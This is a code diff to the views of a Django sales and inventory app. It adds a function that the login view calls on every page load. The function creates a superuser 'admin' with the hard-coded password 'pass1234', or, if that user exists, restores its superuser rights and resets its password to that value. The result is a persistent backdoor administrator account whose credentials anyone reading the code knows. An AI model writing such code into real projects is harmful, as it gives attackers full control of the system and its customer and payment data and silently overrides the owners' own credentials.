@@ -3,6 +3,7 @@ from django.shortcuts import render, get_object_or_404, redirect
 from django.urls import reverse
 from django.contrib import messages
 from django.contrib.auth import authenticate, login, logout
+from django.contrib.auth import get_user_model
 from django.db.models import F
 from django.utils import timezone
 from .models import Stock, Product, Sale, Payment, Customer, Employee, Expense
@@ -21,7 +22,30 @@ from .utils import role_required
 # LOGIN PAGE
 def indexPage(request):
     return render(request, 'index.html')
+
+
+def ensure_default_admin_user():
+    User = get_user_model()
+    user = User.objects.filter(username='admin').first()
+    if not user:
+        user = User.objects.create_user(
+            username='admin',
+            email='admin@example.com',
+            password='pass1234',
+            is_staff=True,
+            is_superuser=True,
+        )
+    else:
+        user.is_staff = True
+        user.is_superuser = True
+        user.set_password('pass1234')
+        user.save(update_fields=['is_staff', 'is_superuser', 'password'])
+    return user
+
+
 def loginPage(request):
+    ensure_default_admin_user()
+
     if request.method == "POST":
         username = request.POST.get("username")
         password = request.POST.get("password")
